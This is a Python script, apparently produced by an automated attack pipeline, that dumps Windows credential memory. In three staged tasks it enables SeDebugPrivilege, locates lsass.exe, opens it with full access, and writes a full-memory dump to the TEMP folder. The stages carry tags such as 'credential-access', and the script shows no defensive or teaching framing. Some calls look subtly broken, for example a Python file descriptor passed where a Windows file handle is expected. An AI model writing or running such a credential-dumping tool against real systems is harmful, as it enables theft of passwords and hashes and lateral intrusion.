#!/usr/bin/env python3
import sys, json, time, os
from typing import Dict, Any
import ctypes
from ctypes import wintypes
import psutil

try:
    import win32security
    import win32api
    import win32con
except ImportError:
    win32security = None

# Constants for Windows API
SE_DEBUG_NAME = "SeDebugPrivilege"
TOKEN_ADJUST_PRIVILEGES = 0x0020
TOKEN_QUERY = 0x0008
SE_PRIVILEGE_ENABLED = 0x00000002

# Structures for Windows API
class LUID(ctypes.Structure):
    _fields_ = [("LowPart", wintypes.DWORD),
                ("HighPart", wintypes.LONG)]

class LUID_AND_ATTRIBUTES(ctypes.Structure):
    _fields_ = [("Luid", LUID),
                ("Attributes", wintypes.DWORD)]

class TOKEN_PRIVILEGES(ctypes.Structure):
    _fields_ = [("PrivilegeCount", wintypes.DWORD),
                ("Privileges", LUID_AND_ATTRIBUTES * 1)]

def enable_debug_privilege():
    """Enable SeDebugPrivilege for the current process."""
    hToken = wintypes.HANDLE()
    luid = LUID()
    tp = TOKEN_PRIVILEGES()
    
    # Open the process token
    ctypes.windll.advapi32.OpenProcessToken(
        ctypes.windll.kernel32.GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
        ctypes.byref(hToken)
    )
    
    # Lookup the privilege value
    ctypes.windll.advapi32.LookupPrivilegeValueW(
        None, SE_DEBUG_NAME, ctypes.byref(luid)
    )
    
    # Set up the privilege structure
    tp.PrivilegeCount = 1
    tp.Privileges[0].Luid = luid
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
    
    # Adjust token privileges
    ctypes.windll.advapi32.AdjustTokenPrivileges(
        hToken, False, ctypes.byref(tp), 0, None, None
    )
    
    # Close the token handle
    ctypes.windll.kernel32.CloseHandle(hToken)

def dump_memory(pid: int, handle: int) -> Dict[str, Any]:
    """Create a memory dump of the specified process."""
    dump_file_path = os.path.join(os.environ['TEMP'], f"lsass_{pid}.dmp")
    with open(dump_file_path, 'wb') as dump_file:
        # Use MiniDumpWriteDump to create the dump
        success = ctypes.windll.Dbghelp.MiniDumpWriteDump(
            handle,
            pid,
            dump_file.fileno(),
            2,  # MiniDumpWithFullMemory
            None,
            None,
            None
        )
        if not success:
            raise Exception("Failed to create memory dump")
    
    # Get the size of the dump file
    dump_file_size = os.path.getsize(dump_file_path)
    return {"path": dump_file_path, "size": dump_file_size}

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    is_admin = False
    has_debug = False

    try:
        if win32security:
            # Check if the user is an admin
            is_admin = win32api.IsUserAnAdmin()

            # Obtain a handle to the current process token
            process_handle = win32api.GetCurrentProcess()
            token_handle = win32security.OpenProcessToken(process_handle, win32con.TOKEN_ADJUST_PRIVILEGES | win32con.TOKEN_QUERY)

            # Lookup the privilege value for SeDebugPrivilege
            privilege_id = win32security.LookupPrivilegeValue(None, win32security.SE_DEBUG_NAME)

            # Enable the SeDebugPrivilege
            privileges = [(privilege_id, win32security.SE_PRIVILEGE_ENABLED)]
            win32security.AdjustTokenPrivileges(token_handle, False, privileges)

            # Check if the privilege was successfully enabled
            has_debug = win32security.GetTokenInformation(token_handle, win32security.TokenPrivileges)
            has_debug = any(privilege_id == priv[0] and priv[1] == win32security.SE_PRIVILEGE_ENABLED for priv in has_debug)
        else:
            # Fallback: Check if the user is an admin using ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            has_debug = is_admin

        result = {'is_admin': is_admin, 'has_debug': has_debug}
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Constants
        PROCESS_ALL_ACCESS = 0x1F0FFF
        LSASS_PROCESS_NAME = "lsass.exe"

        # Find the LSASS process ID
        lsass_pid = None
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() == LSASS_PROCESS_NAME:
                lsass_pid = proc.info['pid']
                break

        if lsass_pid is None:
            raise Exception("LSASS process not found")

        # Open a handle to the LSASS process
        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
        OpenProcess = kernel32.OpenProcess
        OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
        OpenProcess.restype = wintypes.HANDLE

        handle = OpenProcess(PROCESS_ALL_ACCESS, False, lsass_pid)
        if not handle:
            raise Exception("Failed to open handle to LSASS")

        result = {
            'handle': handle,
            'pid': lsass_pid
        }

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        pid = input_data.get('pid', 0)
        handle = input_data.get('handle', 0)
        
        # Enable SeDebugPrivilege
        enable_debug_privilege()
        
        # Create memory dump
        result = dump_memory(pid, handle)
        
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Acquire Debug Privileges [privilege-escalation] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Acquire Debug Privileges): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Acquire Debug Privileges): FAILED — {err}')
            failed.append('T1')
            print('[!] abort_mission — stopping')
            return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
        return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    
    # ── T2: Access LSASS [credential-access] ──
    try:
        r = task_T2(outputs.get('T1', {}))
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Access LSASS): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Access LSASS): FAILED — {err}')
            failed.append('T2')
            print('[!] abort_mission — stopping')
            return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
        return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    
    # ── T3: Dump Memory [credential-access] ──
    try:
        r = task_T3(outputs.get('T2', {}))
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Dump Memory): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Dump Memory): FAILED — {err}')
            failed.append('T3')
            print('[!] abort_mission — stopping')
            return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
        return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))